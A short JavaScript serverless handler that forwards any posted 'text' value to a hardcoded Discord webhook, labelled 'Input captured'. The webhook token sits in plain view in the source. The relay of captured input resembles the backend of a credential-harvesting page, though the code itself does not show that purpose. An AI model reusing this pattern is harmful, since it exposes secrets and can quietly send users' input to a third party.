export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { text } = req.body || {};
  
  try {
    const response = await fetch('https://discord.com/api/webhooks/1534990713845059846/MPtuD6fSiir7-Ay3e6x-by1C-9jYT7vhc_jaQqGHTT0D3pM3pygVP3uGtfff7juZZf4W', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `Input captured: ${text}` }),
    });
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: 'Failed to send to Discord' });
  }
}
